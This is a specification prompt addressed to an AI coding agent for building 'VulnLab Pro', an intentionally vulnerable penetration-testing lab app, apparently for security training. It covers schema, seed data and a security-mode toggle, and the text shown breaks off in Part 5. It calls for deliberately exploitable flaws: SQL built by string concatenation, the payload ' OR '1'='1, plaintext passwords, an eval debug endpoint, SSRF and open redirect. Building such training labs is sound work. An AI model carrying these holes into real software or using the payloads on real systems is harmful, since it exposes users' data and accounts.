@@ -1,0 +1,2579 @@
+╔══════════════════════════════════════════════════════════════════╗
+║         MASTER AI AGENT PROMPT — VULNLAB PRO v2.0               ║
+║   Full-Stack Intentionally Vulnerable Penetration Testing Lab    ║
+╚══════════════════════════════════════════════════════════════════╝
+
+INSTRUCTIONS FOR THE AI AGENT:
+Read every section completely before writing a single line of code.
+Do NOT skip sections. Do NOT summarize with placeholders.
+Every file must be FULLY implemented — no "// TODO" or "// add logic here".
+Every function must have a working body.
+Every vulnerability must be real and exploitable — not fake stubs.
+This is a cybersecurity education tool for local lab use only.
+─────────────────────────────────────────────────────────────────────
+
+═══════════════════════════════════════════════════════════════
+PART 0 — WHO THIS IS FOR AND WHAT YOU ARE BUILDING
+═══════════════════════════════════════════════════════════════
+Purpose
+You are building VulnLab Pro — a self-hosted, intentionally vulnerable
+web application designed for cybersecurity students, ethical hackers, CTF
+players, bug bounty hunters, and penetration testers to practice real-world
+attack and defense techniques in a completely safe, local environment.
+This application is inspired by:
+
+Slack → channels, real-time messaging, file sharing
+Amazon → product listings, cart, checkout, orders
+Social platforms → profiles, posts, comments, follows
+Online banking → wallet, transfers, transaction history
+
+Combined, these modules create a realistic target environment that mirrors
+the complexity of real enterprise applications.
+Who will use this?
+
+Penetration testers learning to find OWASP Top 10 vulnerabilities
+Developers learning secure coding by comparing vulnerable vs. secure code
+Students taking OSCP, CEH, eJPT, or similar certification courses
+CTF players wanting a local realistic practice target
+Trainers running cybersecurity workshops
+
+What makes this different from DVWA?
+Unlike DVWA (which is simplistic and outdated), VulnLab Pro:
+
+Has a realistic multi-module application (not just single form demos)
+Uses a modern stack (GraphQL, React, MySQL, JWT, Socket.io)
+Has a one-click toggle that switches the ENTIRE app's security posture
+Includes production-quality logging so learners can see what defenders see
+Has 10 default users with realistic data to practice IDOR, enumeration, etc.
+Includes a banking system to practice financial logic flaws
+Documents every vulnerability with exploitation steps
+
+
+═══════════════════════════════════════════════════════════════
+PART 1 — TECH STACK (USE EXACTLY THESE — NO SUBSTITUTIONS)
+═══════════════════════════════════════════════════════════════
+1.1 Backend Stack
+LayerTechnologyVersionNotesRuntimeNode.js18 LTSUse ES modules where possibleWeb frameworkExpress.js4.xCore HTTP serverGraphQL serverApollo Server4.xMounted at /graphqlDatabaseMySQL8.xPrimary data storeDB drivermysql2latestRAW QUERIES ONLY — no ORM, this is intentional for SQLi demosReal-timeSocket.io4.xFor chat, notificationsAuth tokensjsonwebtoken9.xJWT creation and verificationPassword hashingbcrypt5.xUsed in hardened mode onlyFile uploadsMulter1.xHandles multipart form dataSessionexpress-session1.xWith mysql2 session storeLoggingWinston3.xJSON Lines format with daily rotationLog rotationwinston-daily-rotate-filelatest30-day retentionRate limitingexpress-rate-limit7.xConditional on security modeSecurity headersHelmet7.xUsed in hardened mode onlyCORScors2.xConfigured per security modeEnv varsdotenv16.xProcess managernodemon3.xDevelopment auto-restart
+CRITICAL NOTE ON DATABASE DRIVER:
+Use mysql2 with RAW SQL string concatenation in vulnerable mode (e.g.,
+"SELECT * FROM users WHERE username='" + username + "'") so that SQL
+injection is REAL and exploitable. In hardened mode, switch to parameterized
+prepared statements using ? placeholders. This is the core of the A03
+injection demonstration and must be genuinely exploitable.
+1.2 Frontend Stack
+LayerTechnologyNotesFrameworkReact 18Functional components + hooksBuild toolVite 5.xFast dev serverStylingPlain CSS with CSS variablesNo Tailwind — keeps bundle smallGraphQL clientApollo Client 3.xFor all GraphQL operationsHTTP clientAxiosFor REST endpointsReal-timeSocket.io-clientChat and notificationsRoutingReact Router v6SPA routingState managementReact Context APIAuthContext, SecurityModeContext, CartContext
+1.3 Why Raw SQL Instead of an ORM?
+Using Prisma or Sequelize would PREVENT genuine SQL injection because
+these tools automatically parameterize queries. VulnLab Pro MUST use raw
+mysql2 queries so that learners can run actual ' OR '1'='1 payloads,
+use sqlmap, and see real UNION-based extraction. The educational value
+is lost if queries are auto-sanitized. In hardened mode, the same endpoints
+use ? placeholders which is the actual fix.
+
+═══════════════════════════════════════════════════════════════
+PART 2 — COMPLETE FOLDER AND FILE STRUCTURE
+═══════════════════════════════════════════════════════════════
+Generate EVERY file listed here. Do not skip any.
+vulnlab-pro/
+│
+├── README.md                          ← Complete Kali Linux install guide
+├── docker-compose.yml                 ← Full orchestration file
+├── docker-compose.hardened.yml        ← Override for hardened mode
+├── .env.example                       ← All required env vars with comments
+├── .gitignore                         ← Excludes .env, logs/, node_modules/, uploads/
+├── package.json                       ← Root workspace package
+│
+├── backend/
+│   ├── index.js                       ← Entry point: Express + Apollo + Socket.io init
+│   ├── package.json
+│   │
+│   ├── config/
+│   │   ├── database.js                ← mysql2 connection pool setup
+│   │   ├── jwt.js                     ← JWT config, signing, verifying
+│   │   └── app.js                     ← Express app setup (middleware registration)
+│   │
+│   ├── db/
+│   │   ├── schema.sql                 ← All CREATE TABLE statements
+│   │   ├── seed.sql                   ← All INSERT seed data (10 users, 50 products, etc.)
+│   │   └── migrate.js                 ← Runs schema.sql + seed.sql on first start
+│   │
+│   ├── graphql/
+│   │   ├── index.js                   ← Apollo Server setup, schema merge
+│   │   ├── typeDefs/
+│   │   │   ├── user.graphql           ← User types: User, AuthPayload, etc.
+│   │   │   ├── product.graphql        ← Product, Order, OrderItem types
+│   │   │   ├── channel.graphql        ← Channel, Message types
+│   │   │   ├── transaction.graphql    ← Transaction, Wallet types
+│   │   │   ├── post.graphql           ← Post, Comment, Like types
+│   │   │   └── admin.graphql          ← Admin-only types and operations
+│   │   └── resolvers/
+│   │       ├── userResolver.js        ← User CRUD, auth resolvers
+│   │       ├── productResolver.js     ← Product CRUD resolvers
+│   │       ├── channelResolver.js     ← Channel + message resolvers
+│   │       ├── transactionResolver.js ← Balance, transfer resolvers
+│   │       ├── postResolver.js        ← Social post resolvers
+│   │       └── adminResolver.js       ← Admin-only resolvers
+│   │
+│   ├── routes/
+│   │   ├── auth.js                    ← POST /api/auth/register, /login, /logout, /me
+│   │   ├── admin.js                   ← Admin REST endpoints (balance update, log download)
+│   │   ├── upload.js                  ← POST /api/upload/* (Multer handling)
+│   │   ├── debug.js                   ← /api/debug/ping, /api/debug/eval (vuln endpoints)
+│   │   ├── webhook.js                 ← /api/webhook/test (SSRF endpoint)
+│   │   └── redirect.js                ← /api/redirect?url= (Open Redirect endpoint)
+│   │
+│   ├── middleware/
+│   │   ├── authenticate.js            ← JWT verification, attaches req.user
+│   │   ├── authorize.js               ← Role checking (admin, sudo, user)
+│   │   ├── securityMode.js            ← Reads DB, attaches req.securityMode to every request
+│   │   ├── requestLogger.js           ← Logs every HTTP request to Winston + DB
+│   │   ├── rateLimiter.js             ← Conditional rate limiter (off in vuln mode)
+│   │   ├── csrfProtection.js          ← CSRF tokens (off in vuln mode)
+│   │   ├── securityHeaders.js         ← Helmet + custom headers (off in vuln mode)
+│   │   └── inputSanitizer.js          ← XSS + injection sanitization (off in vuln mode)
+│   │
+│   ├── services/
+│   │   ├── authService.js             ← login/register business logic
+│   │   ├── userService.js             ← User CRUD logic
+│   │   ├── productService.js          ← Product CRUD logic
+│   │   ├── channelService.js          ← Channel + message logic
+│   │   ├── transactionService.js      ← Balance transfer logic
+│   │   ├── uploadService.js           ← File validation + storage logic
+│   │   └── notificationService.js     ← Socket.io event emitters
+│   │
+│   ├── utils/
+│   │   ├── logger.js                  ← Winston configuration
+│   │   ├── sanitize.js                ← Input sanitizers used in hardened mode
+│   │   ├── validators.js              ← Field validators (email, password strength, etc.)
+│   │   └── ipUtils.js                 ← IP address extraction and validation
+│   │
+│   └── uploads/                       ← Uploaded files stored here (git-ignored)
+│       ├── avatars/
+│       ├── products/
+│       ├── channels/
+│       └── documents/
+│
+├── frontend/
+│   ├── index.html
+│   ├── vite.config.js
+│   ├── package.json
+│   │
+│   └── src/
+│       ├── main.jsx                   ← React entry, Apollo Provider, Router
+│       ├── App.jsx                    ← Route definitions
+│       │
+│       ├── apollo/
+│       │   ├── client.js              ← Apollo Client config with JWT auth link
+│       │   └── queries/               ← All GQL query/mutation strings
+│       │       ├── authQueries.js
+│       │       ├── productQueries.js
+│       │       ├── channelQueries.js
+│       │       ├── transactionQueries.js
+│       │       ├── postQueries.js
+│       │       └── adminQueries.js
+│       │
+│       ├── context/
+│       │   ├── AuthContext.jsx        ← Current user, login/logout functions
+│       │   ├── CartContext.jsx        ← Shopping cart state
+│       │   └── SecurityModeContext.jsx← Current security mode, toggle function
+│       │
+│       ├── pages/
+│       │   ├── Login.jsx
+│       │   ├── Register.jsx
+│       │   ├── Dashboard.jsx          ← Home after login
+│       │   ├── Profile.jsx            ← User profile (own + others via IDOR)
+│       │   ├── EditProfile.jsx
+│       │   ├── Feed.jsx               ← Social feed
+│       │   ├── Channels.jsx           ← Channel list
+│       │   ├── ChannelView.jsx        ← Single channel chat
+│       │   ├── DirectMessage.jsx      ← DM between two users
+│       │   ├── Marketplace.jsx        ← Product listing
+│       │   ├── ProductDetail.jsx      ← Single product
+│       │   ├── Cart.jsx
+│       │   ├── Checkout.jsx
+│       │   ├── Orders.jsx
+│       │   ├── Wallet.jsx             ← Balance + transfer
+│       │   ├── TransactionHistory.jsx
+│       │   ├── Admin.jsx              ← Admin dashboard (protected)
+│       │   ├── AdminUsers.jsx
+│       │   ├── AdminProducts.jsx
+│       │   ├── AdminLogs.jsx
+│       │   ├── AdminBalance.jsx       ← Sudo balance management
+│       │   └── NotFound.jsx
+│       │
+│       ├── components/
+│       │   ├── layout/
+│       │   │   ├── Navbar.jsx         ← Top bar with security mode toggle
+│       │   │   ├── Sidebar.jsx        ← Left nav (channels, links)
+│       │   │   └── AdminLayout.jsx    ← Admin panel wrapper
+│       │   ├── auth/
+│       │   │   ├── LoginForm.jsx
+│       │   │   └── RegisterForm.jsx
+│       │   ├── channel/
+│       │   │   ├── ChannelList.jsx
+│       │   │   ├── MessageList.jsx
+│       │   │   ├── MessageBubble.jsx
+│       │   │   └── MessageInput.jsx
+│       │   ├── product/
+│       │   │   ├── ProductCard.jsx
+│       │   │   ├── ProductForm.jsx
+│       │   │   └── ProductImage.jsx
+│       │   ├── social/
+│       │   │   ├── PostCard.jsx
+│       │   │   ├── PostForm.jsx
+│       │   │   └── UserCard.jsx
+│       │   ├── banking/
+│       │   │   ├── BalanceCard.jsx
+│       │   │   ├── TransferForm.jsx
+│       │   │   └── TransactionRow.jsx
+│       │   ├── admin/
+│       │   │   ├── UserTable.jsx
+│       │   │   ├── LogViewer.jsx
+│       │   │   ├── BalanceEditor.jsx
+│       │   │   └── SecurityToggle.jsx ← The big mode switch
+│       │   └── shared/
+│       │       ├── Modal.jsx
+│       │       ├── Toast.jsx
+│       │       ├── Spinner.jsx
+│       │       ├── WarningBanner.jsx   ← "INTENTIONALLY VULNERABLE" banner
+│       │       ├── ConfirmDialog.jsx
+│       │       └── FileUpload.jsx
+│       │
+│       └── styles/
+│           ├── variables.css          ← All CSS custom properties
+│           ├── global.css             ← Reset + base styles
+│           ├── components.css         ← Reusable component styles
+│           └── pages.css              ← Page-specific styles
+│
+├── logs/                              ← Created at runtime, git-ignored
+│   ├── app-YYYY-MM-DD.log
+│   └── security-YYYY-MM-DD.log
+│
+└── docs/
+    ├── VULNERABILITIES.md             ← Full exploit guide for every vuln
+    ├── API.md                         ← All REST + GraphQL endpoints
+    └── ARCHITECTURE.md                ← System design overview
+
+═══════════════════════════════════════════════════════════════
+PART 3 — COMPLETE DATABASE SCHEMA
+═══════════════════════════════════════════════════════════════
+File: backend/db/schema.sql
+Create ALL of the following tables. Add foreign keys and indexes.
+Execute this file automatically when the application starts if tables
+do not exist (check with SHOW TABLES).
+sql-- ─────────────────────────────────────────────────────────────
+-- DATABASE: vulnlab
+-- ─────────────────────────────────────────────────────────────
+CREATE DATABASE IF NOT EXISTS vulnlab CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
+USE vulnlab;
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: users
+-- Purpose: All registered users including admins
+-- Vuln notes:
+--   password_plain: always stores plaintext (for A02 crypto failure demo)
+--   secret_note: contains fake sensitive data (for IDOR demo A01)
+--   ssn: fake social security number (for IDOR demo)
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS users (
+  id                INT AUTO_INCREMENT PRIMARY KEY,
+  username          VARCHAR(50) UNIQUE NOT NULL,
+  email             VARCHAR(100) UNIQUE NOT NULL,
+  password          VARCHAR(255) NOT NULL,      -- bcrypt in hardened, plaintext in vulnerable
+  password_plain    VARCHAR(100) NOT NULL,       -- ALWAYS plaintext for A02 demo
+  role              ENUM('user','moderator','seller','admin','sudo') DEFAULT 'user',
+  full_name         VARCHAR(150),
+  avatar_url        VARCHAR(500) DEFAULT '/uploads/avatars/default.png',
+  bio               TEXT,
+  phone             VARCHAR(20),
+  address           TEXT,
+  ssn               VARCHAR(15),                 -- fake SSN e.g. "123-45-6789" for IDOR
+  dob               DATE,
+  secret_note       TEXT,                         -- fake API keys, secrets for IDOR
+  balance           DECIMAL(15,2) DEFAULT 1000.00,
+  is_active         BOOLEAN DEFAULT TRUE,
+  is_locked         BOOLEAN DEFAULT FALSE,        -- lockout after failed logins (hardened mode)
+  failed_logins     INT DEFAULT 0,
+  last_login        TIMESTAMP NULL,
+  last_ip           VARCHAR(45),
+  reset_token       VARCHAR(255),
+  reset_token_expiry TIMESTAMP NULL,
+  created_at        TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  updated_at        TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: app_settings
+-- Purpose: Global application settings, especially security_mode
+-- This is the key table — the toggle switch reads/writes here
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS app_settings (
+  id              INT PRIMARY KEY DEFAULT 1,
+  security_mode   ENUM('vulnerable','hardened') DEFAULT 'vulnerable',
+  app_name        VARCHAR(100) DEFAULT 'VulnLab Pro',
+  allow_register  BOOLEAN DEFAULT TRUE,
+  maintenance     BOOLEAN DEFAULT FALSE,
+  updated_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+  updated_by      INT,
+  FOREIGN KEY (updated_by) REFERENCES users(id) ON DELETE SET NULL
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: channels
+-- Purpose: Slack-like messaging channels
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS channels (
+  id          INT AUTO_INCREMENT PRIMARY KEY,
+  name        VARCHAR(100) UNIQUE NOT NULL,
+  slug        VARCHAR(110) UNIQUE NOT NULL,      -- URL-safe name e.g. "general"
+  description TEXT,
+  is_private  BOOLEAN DEFAULT FALSE,
+  created_by  INT,
+  created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: channel_members
+-- Purpose: Many-to-many: users <-> channels
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS channel_members (
+  channel_id  INT NOT NULL,
+  user_id     INT NOT NULL,
+  role        ENUM('member','moderator','owner') DEFAULT 'member',
+  joined_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  PRIMARY KEY (channel_id, user_id),
+  FOREIGN KEY (channel_id) REFERENCES channels(id) ON DELETE CASCADE,
+  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: messages
+-- Purpose: Messages in channels
+-- Vuln note: content stored RAW (no escaping) in vuln mode → XSS
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS messages (
+  id          INT AUTO_INCREMENT PRIMARY KEY,
+  channel_id  INT NOT NULL,
+  sender_id   INT NOT NULL,
+  content     TEXT NOT NULL,            -- stored raw (XSS) or escaped (hardened)
+  file_url    VARCHAR(500),
+  file_name   VARCHAR(255),
+  file_type   VARCHAR(100),
+  reply_to    INT,                       -- thread reply support
+  is_deleted  BOOLEAN DEFAULT FALSE,
+  is_pinned   BOOLEAN DEFAULT FALSE,
+  created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  edited_at   TIMESTAMP NULL,
+  FOREIGN KEY (channel_id) REFERENCES channels(id) ON DELETE CASCADE,
+  FOREIGN KEY (sender_id) REFERENCES users(id) ON DELETE CASCADE,
+  FOREIGN KEY (reply_to) REFERENCES messages(id) ON DELETE SET NULL
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: direct_messages
+-- Purpose: Private DMs between two users
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS direct_messages (
+  id          INT AUTO_INCREMENT PRIMARY KEY,
+  sender_id   INT NOT NULL,
+  receiver_id INT NOT NULL,
+  content     TEXT NOT NULL,
+  is_read     BOOLEAN DEFAULT FALSE,
+  created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  FOREIGN KEY (sender_id) REFERENCES users(id) ON DELETE CASCADE,
+  FOREIGN KEY (receiver_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: products
+-- Purpose: E-commerce product listings
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS products (
+  id            INT AUTO_INCREMENT PRIMARY KEY,
+  name          VARCHAR(255) NOT NULL,
+  description   TEXT,
+  price         DECIMAL(10,2) NOT NULL,
+  original_price DECIMAL(10,2),
+  stock         INT DEFAULT 0,
+  category      VARCHAR(100),
+  brand         VARCHAR(100),
+  sku           VARCHAR(100) UNIQUE,
+  image_url     VARCHAR(500),
+  seller_id     INT,
+  is_active     BOOLEAN DEFAULT TRUE,
+  is_featured   BOOLEAN DEFAULT FALSE,
+  views         INT DEFAULT 0,
+  rating        DECIMAL(3,2) DEFAULT 0.00,
+  created_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  updated_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+  FOREIGN KEY (seller_id) REFERENCES users(id) ON DELETE SET NULL
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: cart_items
+-- Purpose: User shopping carts
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS cart_items (
+  id          INT AUTO_INCREMENT PRIMARY KEY,
+  user_id     INT NOT NULL,
+  product_id  INT NOT NULL,
+  quantity    INT DEFAULT 1,
+  added_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
+  FOREIGN KEY (product_id) REFERENCES products(id) ON DELETE CASCADE
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: orders
+-- Purpose: Completed purchase orders
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS orders (
+  id              INT AUTO_INCREMENT PRIMARY KEY,
+  buyer_id        INT NOT NULL,
+  total           DECIMAL(10,2) NOT NULL,
+  shipping_addr   TEXT,
+  status          ENUM('pending','paid','processing','shipped','delivered','cancelled') DEFAULT 'pending',
+  payment_method  VARCHAR(50) DEFAULT 'wallet',
+  notes           TEXT,
+  created_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  updated_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+  FOREIGN KEY (buyer_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: order_items
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS order_items (
+  id                  INT AUTO_INCREMENT PRIMARY KEY,
+  order_id            INT NOT NULL,
+  product_id          INT NOT NULL,
+  quantity            INT NOT NULL,
+  price_at_purchase   DECIMAL(10,2) NOT NULL,
+  FOREIGN KEY (order_id) REFERENCES orders(id) ON DELETE CASCADE,
+  FOREIGN KEY (product_id) REFERENCES products(id) ON DELETE SET NULL
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: transactions
+-- Purpose: Banking transfers and balance changes
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS transactions (
+  id              INT AUTO_INCREMENT PRIMARY KEY,
+  sender_id       INT,
+  receiver_id     INT,
+  amount          DECIMAL(15,2) NOT NULL,
+  type            ENUM('transfer','deposit','withdrawal','purchase','refund','admin_adjustment') NOT NULL,
+  status          ENUM('pending','completed','failed','reversed') DEFAULT 'pending',
+  reference       VARCHAR(100),                  -- unique transaction ref
+  note            VARCHAR(500),
+  order_id        INT,                           -- linked order if purchase
+  created_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  FOREIGN KEY (sender_id) REFERENCES users(id) ON DELETE SET NULL,
+  FOREIGN KEY (receiver_id) REFERENCES users(id) ON DELETE SET NULL,
+  FOREIGN KEY (order_id) REFERENCES orders(id) ON DELETE SET NULL
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: posts
+-- Purpose: Social media posts
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS posts (
+  id          INT AUTO_INCREMENT PRIMARY KEY,
+  author_id   INT NOT NULL,
+  content     TEXT NOT NULL,
+  image_url   VARCHAR(500),
+  visibility  ENUM('public','followers','private') DEFAULT 'public',
+  like_count  INT DEFAULT 0,
+  comment_count INT DEFAULT 0,
+  created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  updated_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+  FOREIGN KEY (author_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: comments
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS comments (
+  id          INT AUTO_INCREMENT PRIMARY KEY,
+  post_id     INT NOT NULL,
+  author_id   INT NOT NULL,
+  content     TEXT NOT NULL,
+  created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  FOREIGN KEY (post_id) REFERENCES posts(id) ON DELETE CASCADE,
+  FOREIGN KEY (author_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: likes
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS likes (
+  user_id     INT NOT NULL,
+  post_id     INT NOT NULL,
+  created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  PRIMARY KEY (user_id, post_id),
+  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
+  FOREIGN KEY (post_id) REFERENCES posts(id) ON DELETE CASCADE
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: follows
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS follows (
+  follower_id   INT NOT NULL,
+  following_id  INT NOT NULL,
+  created_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  PRIMARY KEY (follower_id, following_id),
+  FOREIGN KEY (follower_id) REFERENCES users(id) ON DELETE CASCADE,
+  FOREIGN KEY (following_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: notifications
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS notifications (
+  id          INT AUTO_INCREMENT PRIMARY KEY,
+  user_id     INT NOT NULL,
+  type        VARCHAR(50) NOT NULL,    -- 'follow', 'like', 'comment', 'transfer', 'message'
+  message     VARCHAR(500),
+  link        VARCHAR(200),
+  is_read     BOOLEAN DEFAULT FALSE,
+  created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: uploads
+-- Purpose: Track every uploaded file
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS uploads (
+  id              INT AUTO_INCREMENT PRIMARY KEY,
+  uploader_id     INT,
+  original_name   VARCHAR(255) NOT NULL,
+  stored_name     VARCHAR(255) NOT NULL,
+  stored_path     VARCHAR(500) NOT NULL,
+  mime_type       VARCHAR(100),
+  file_size_bytes INT,
+  upload_type     ENUM('avatar','product','channel','document','other') DEFAULT 'other',
+  is_public       BOOLEAN DEFAULT TRUE,
+  created_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  FOREIGN KEY (uploader_id) REFERENCES users(id) ON DELETE SET NULL
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: request_logs
+-- Purpose: Mirror of every HTTP request (also written to log file)
+-- Vuln note: In vulnerable mode, request_body is logged including
+--            passwords and tokens — intentional for demo purposes
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS request_logs (
+  id              BIGINT AUTO_INCREMENT PRIMARY KEY,
+  timestamp       TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  method          VARCHAR(10),
+  path            VARCHAR(500),
+  query_string    VARCHAR(1000),
+  operation_name  VARCHAR(200),    -- GraphQL operation name if applicable
+  user_id         INT,
+  username        VARCHAR(50),
+  ip_address      VARCHAR(45),
+  user_agent      TEXT,
+  status_code     INT,
+  request_body    MEDIUMTEXT,      -- full body in vuln mode, redacted in hardened
+  response_size   INT,
+  duration_ms     INT,
+  security_mode   VARCHAR(20),
+  error_message   TEXT,
+  is_suspicious   BOOLEAN DEFAULT FALSE  -- flagged by heuristics
+);
+
+-- ─────────────────────────────────────────────────────────────
+-- TABLE: security_events
+-- Purpose: Track specific security-relevant events
+-- ─────────────────────────────────────────────────────────────
+CREATE TABLE IF NOT EXISTS security_events (
+  id          BIGINT AUTO_INCREMENT PRIMARY KEY,
+  timestamp   TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  event_type  VARCHAR(100),   -- 'auth_failure', 'sqli_attempt', 'xss_attempt', etc.
+  user_id     INT,
+  ip_address  VARCHAR(45),
+  details     TEXT,
+  severity    ENUM('low','medium','high','critical') DEFAULT 'medium',
+  security_mode VARCHAR(20)
+);
+
+═══════════════════════════════════════════════════════════════
+PART 4 — DEFAULT SEED DATA (ALL 10 USERS + CONTENT)
+═══════════════════════════════════════════════════════════════
+File: backend/db/seed.sql
+4.1 The 10 Default Users
+IMPORTANT: All passwords must be stored BOTH as bcrypt hash (in password column)
+AND as plaintext (in password_plain column). The password column is what the app
+checks at login, and in vulnerable mode it also checks the plaintext version directly.
+#usernameemailpasswordrolebalanceSSN (fake)1adminadmin@vulnlab.localAdmin@123sudo99999.00000-00-00012johnjohn@vulnlab.localjohn123user5000.00123-45-00023alicealice@vulnlab.localpassworduser3200.00123-45-00034mikemike@vulnlab.local123456user1500.00123-45-00045dianadiana@vulnlab.localdiana123seller8800.00123-45-00056eveeve@vulnlab.localeve123user200.00123-45-00067frankfrank@vulnlab.localtest123user12000.00123-45-00078gracegrace@vulnlab.localgrace123moderator700.00123-45-00089henryhenry@vulnlab.local111111seller4400.00123-45-000910ivanivan@vulnlab.localqwertyadmin6600.00123-45-0010
+Each user must also have:
+
+secret_note: contain a fake secret like "AWS API Key: AKIAIOSFODNN7EXAMPLE"
+or "DB Password: dbpass123" or "Internal token: eyJ0eXAiOi..." — for IDOR demos
+bio: realistic bio text
+full_name: realistic full name
+address: fake street address
+phone: fake phone number
+
+4.2 Default Channels (5)
+Seed these channels and add ALL 10 users to #general and #announcements:
+ChannelDescriptionPrivategeneralGeneral discussionNoannouncementsImportant announcementsNosecurity-researchVulnerability discussionNomarketplaceBuying and sellingNodev-teamDevelopment teamYes
+4.3 Default Products (50)
+Generate 50 products across these categories:
+
+Electronics (15): laptops, phones, tablets, accessories — prices $50–$2000
+Books (10): security books, programming books — prices $10–$60
+Clothing (10): various — prices $15–$150
+Tools (8): hardware tools — prices $20–$300
+Services (7): digital services — prices $5–$500
+
+Each product needs: name, description, price, original_price (higher for discount effect),
+stock (5–100), category, brand, sku (unique), image_url (use placeholder path),
+seller_id (assign to john, diana, henry, frank).
+4.4 Default Messages
+Seed 20 messages in #general from various users with realistic conversation content.
+Seed 5 messages in #announcements from admin user.
+Seed 2 messages in #security-research that look like security discussion.
+4.5 Default Posts (10)
+Seed 10 social posts from different users with realistic content.
+4.6 Default Transactions
+Seed 20 fake transactions between users (transfers, purchases) to populate history.
+4.7 App Settings
+sqlINSERT INTO app_settings (id, security_mode, app_name) VALUES (1, 'vulnerable', 'VulnLab Pro')
+ON DUPLICATE KEY UPDATE id=id;
+
+═══════════════════════════════════════════════════════════════
+PART 5 — SECURITY MODE TOGGLE: COMPLETE SPECIFICATION
+═══════════════════════════════════════════════════════════════
+5.1 How the Toggle Works
+The security mode is stored in app_settings.security_mode in MySQL.
+On every single HTTP request, the securityMode middleware reads this value
+from the database (or a 10-second in-memory cache to reduce DB load) and
+attaches it to req.securityMode.
+Every single route handler, GraphQL resolver, middleware, and service
+function that has dual behavior checks req.securityMode or
+receives mode as a parameter and branches accordingly.
+5.2 The Toggle Endpoint
+POST /api/admin/security-mode
+Authorization: Bearer <admin_or_sudo_jwt>
+Body: { "mode": "vulnerable" | "hardened" }
+This updates app_settings, logs the change with who changed it and when,
+and emits a Socket.io event security:mode_changed so all connected clients
+update their UI in real time.
+5.3 Frontend Toggle Component
+The toggle is visible in the NAVBAR for all users (read-only for non-admins).
+For admins, clicking it shows a confirmation modal:
+"You are switching to [VULNERABLE/HARDENED] mode. This affects all users."
+Visual design:
+  [ ⚠ VULNERABLE MODE ]    [ ✓ HARDENED MODE ]
